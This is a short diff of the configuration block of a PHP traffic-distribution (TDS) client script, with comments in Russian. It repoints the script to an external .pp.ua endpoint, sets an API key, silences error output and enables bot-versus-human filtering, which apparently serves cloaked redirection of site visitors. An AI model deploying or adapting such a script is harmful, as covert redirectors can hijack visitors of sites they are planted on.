@@ -1,9 +1,9 @@
 <?php
 @ini_set('display_errors', 0);
 @error_reporting(0);
-$z_id = 'dwl';//ID группы
-$z_key_api_host = 'LmRe4q';//API ключ
-$z_url = 'http://tds.com/?api=';//ссылка на TDS (замените только домен)
+$z_id = '2';//ID группы
+$z_key_api_host = 'mLRe4q';//API ключ
+$z_url = 'http://bonslend.pp.ua/?api=';//ссылка на TDS (замените только домен)
 $z_cf_ip = 0;//определять IP посетителя по $_SERVER["HTTP_CF_CONNECTING_IP"] (0/1)
 $z_em_referer = 0;//если пустой реферер - это бот (0/1)
 $z_em_useragent = 1;//если пустой юзерагент - это бот (0/1)
